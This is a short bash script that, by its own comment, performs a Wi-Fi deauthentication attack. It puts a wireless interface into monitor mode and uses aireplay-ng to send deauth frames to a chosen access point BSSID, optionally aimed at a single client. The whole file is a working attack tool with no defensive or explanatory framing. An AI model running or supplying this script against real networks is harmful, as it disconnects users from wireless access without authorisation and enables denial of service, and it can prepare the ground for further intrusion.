#!/bin/bash
# this script performs a deauthentication attack using aireplay-ng.
interface=$(ip route | grep default | awk '{print $5}')
# Parse arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --interface) interface="$2"; shift ;;
        --deauth) deauth=true ;;
        --bssid) bssid="$2"; shift ;;
        --client) client="$2"; shift ;;
        *) echo "Unknown parameter: $1"; exit 1 ;;
    esac
    shift
done

if [ "$deauth" = true ]; then
    if [ -z "$bssid" ]; then
        echo "Please specify --bssid for deauth attack"
        exit 1
    fi
    # Start monitor mode
    sudo airmon-ng start "$interface"
    mon_interface="${interface}mon"
    # Perform deauth attack
    if [ -n "$client" ]; then
        sudo aireplay-ng --deauth 10 -a "$bssid" -c "$client" "$mon_interface"
    else
        sudo aireplay-ng --deauth 10 -a "$bssid" "$mon_interface"
    fi
    # Stop monitor mode
    sudo airmon-ng stop "$mon_interface"
fi
